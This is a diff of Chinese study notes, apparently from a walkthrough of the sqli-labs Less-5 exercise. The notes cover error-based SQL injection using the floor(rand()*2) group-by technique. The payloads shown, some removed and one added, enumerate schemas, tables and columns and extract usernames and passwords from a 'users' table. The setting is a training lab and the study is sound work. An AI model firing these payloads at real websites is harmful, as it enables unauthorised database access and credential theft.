@@ -40,10 +40,10 @@ select count(*),concat_ws(char(32,58,32),([查询语句]),floor(rand(0)*2)) as a
 ?id=-1' union all select count(*),2,concat( '~',(select schema_name from information_schema.schemata limit 4,1),'~',floor(rand()*2)) as a from information_schema.schemata group by a %23 //获取 数据库 security 这里最好实用union all 这样，否则需要多次访问才能获取回复
 ```
 ![[Pasted image 20260529164648.png]]
+
+剩下的就不一一叙述了 优化一下payload
 ```
-剩下的就不一一叙述了
--1' union all select count(*),2,concat( '~',(select table_name from information_schema.tables where table_schema = 'security' limit 3,1),'~',floor(rand()*2)) as a from information_schema.schemata group by a %23 //获取表 users
-	-1' union all select count(*),1,concat( '~',(select column_name from information_schema.columns where table_name= 'users' limit 2,1),'~',floor(rand()*2)) as a from information_schema.schemata group by a %23  // 这里爆出了他三个字段，注意如果字段不存在也是返回you are in 
-	-1' union all select count(*),1,concat( '~',(select concat(id,username,password) from users limit 2,1),'~',floor(rand()*2)) as a from information_schema.schemata group by a %23  // 成功拿到 password username
+?id=-1' union select 1,count(*),concat((select password from users limit 0,1),floor(rand()*2)) as x from information_schema.tables group by x--+
 
 ```
+![](assets/Less5/file-20260530135049067.png)
